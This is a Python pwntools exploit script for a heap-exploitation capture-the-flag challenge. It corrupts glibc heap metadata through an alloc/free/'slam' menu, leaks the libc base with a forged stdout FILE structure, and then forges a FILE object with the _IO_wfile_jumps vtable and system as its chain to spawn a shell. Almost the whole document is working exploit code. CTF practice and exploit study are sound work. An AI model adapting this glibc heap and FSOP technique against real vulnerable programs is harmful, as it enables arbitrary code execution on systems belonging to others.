from pwn import *
context.binary = elf = ELF("./chal_patched")
context.arch = "amd64"
# context.log_level = "debug"

def s():
    sleep(0.2)

p = process()

def alloc(idx, size, content):
    p.sendlineafter(b"cmd> ", b"1")
    s()
    p.sendlineafter(b"index> ", str(idx).encode())
    s()
    p.sendlineafter(b"size> ", str(size).encode())
    s()
    p.sendlineafter(b"content> ", content)
    s()

def free(idx):
    p.sendlineafter(b"cmd> ", b"2")
    s()
    p.sendlineafter(b"index> ", str(idx).encode())
    s()

def slam(idx, pos):
    p.sendlineafter(b"cmd> ", b"3")
    s()
    p.sendlineafter(b"index> ", str(idx).encode())
    s()
    p.sendlineafter(b"pos> ", str(pos).encode())
    s()

gdb.attach(p)
alloc(0, 0x420, b"")
fakechunk = b"A"*0x60 + p64(0) + p64(0x3c0+0x20|1)
alloc(1, 0x428, fakechunk) #p1
alloc(3, 0x10, b"")#guard chunk
alloc(2, 0x418, b"")#p2
alloc(3, 0x10, b"")#guard chunk
slam(64, 6)
p.sendline(p16(0x3)*(0x1000//0x2)+p64(0x0)+p64(0x501-0x60))
free(1)
alloc(3, 0x500, b"")
free(0)
alloc(1, 0x430, b"")
mp = 0x203180
target = 0x2031c8 #mp_.tcachebins
stdout = 0x00000000002045c0
alloc(3, 0xa, b"B"*8 + b"\xc8\x31")
alloc(3, 0x2, b"\xc0\x45")
free(1)
alloc(1, 0x430, b"\xc0\x45")

free(2)
alloc(3, 0x450, b"")
readpayload = p64(0xfbad1887) + p64(0)*3 + p8(0)
#idx = (where pointer is - entries base in perthread)/8
#size = 0x20 + (idx * 0x10)
alloc(0, 0x2d20-8, readpayload)
leak = p.recvline()[:8]
leak = u64(leak.ljust(8, b"\x00"))
leak = leak - 0x204644
print(hex(leak))

stdout = leak + stdout
system = leak + 0x0000000000058740
io_wfile_jumps = leak + 0x0000000000202228
fs = FileStructure()
fs.flags = u64("  " + "sh".ljust(6, "\x00"))
fs._IO_write_base = 0
fs._IO_write_ptr = 1
fs._lock = stdout-0x10
fs.chain = system
fs._codecvt = stdout
fs._wide_data = stdout - 0x48
fs.vtable = io_wfile_jumps

alloc(1, 0x2460-8, bytes(fs))

p.interactive()
